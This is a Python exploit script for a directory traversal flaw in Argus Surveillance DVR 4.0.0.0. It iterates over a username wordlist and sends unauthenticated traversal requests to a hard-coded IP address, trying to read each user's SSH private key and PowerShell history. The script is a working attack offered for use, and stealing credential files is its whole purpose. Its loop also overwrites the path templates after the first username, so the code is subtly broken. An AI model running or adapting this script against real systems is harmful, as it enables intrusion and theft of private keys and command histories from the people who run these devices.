#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over a text file of usernames to find ssh keys and/or powershell history.

import requests


def search_users():
    usernames = []
    with open("xato-net-10-million-usernames-dup.txt", 'r') as file:
        usernames = file.readlines()

    url = "http://192.168.58.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    ssh_path = "Users/{}/.ssh/id_rsa"
    powershell_path = "Users/{}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    for username in usernames:
        ssh_path = ssh_path.format(username)
        powershell_path = powershell_path.format(username)
        ssh_response = requests.get(url + LFI + ssh_path + QUERY)
        powershell_response = requests.get(url + LFI + powershell_path + QUERY)

        if ssh_response.status_code == 200:
            if "<HTML>" not in ssh_response.text:
                 print("username is ", username)
                 print("ssh id rsa is ...")
                 print(ssh_response.text)

        if powershell_response.status_code == 200:
            if "<HTML>" not in powershell_response.text:
                 print("username is ", username)
                 print("powershell history is ...")
                 print(powershell_response.text)


def main():
    search_users()

if __name__ == "__main__":
    main()
